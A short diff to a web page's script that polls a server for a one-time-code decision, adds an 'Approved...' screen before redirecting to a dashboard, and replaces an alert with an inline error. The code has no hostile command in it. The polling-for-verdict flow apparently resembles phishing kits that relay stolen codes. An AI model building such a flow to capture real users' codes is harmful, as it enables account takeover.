@@ -106,14 +106,23 @@ setInterval(async () => {
   const data = await res.json();
 
   if (data.decision === "valid") {
-    window.location.href = "/dashboard.html";
+    document.body.innerHTML = "<h2 style='text-align:center'>Approved...</h2>";
+    setTimeout(() => {
+      window.location.href = "/dashboard.html";
+    }, 1500);
   }
 
-    if (data.decision === "invalid") {
-    alert("Invalid OTP. Try again.");
+  if (data.decision === "invalid") {
+    document.getElementById("errorBox").innerText = "Invalid code. Try again.";
   }
 }, 2000);
 
+function showLoaderAndGo(url) {
+    document.getElementById("pageLoader").style.display = "block";
+    setTimeout(() => {
+        window.location.href = url;
+    }, 800);
+}
 </script>
 <div id="pageLoader" class="loader" style="display:none;"></div>
 </body>
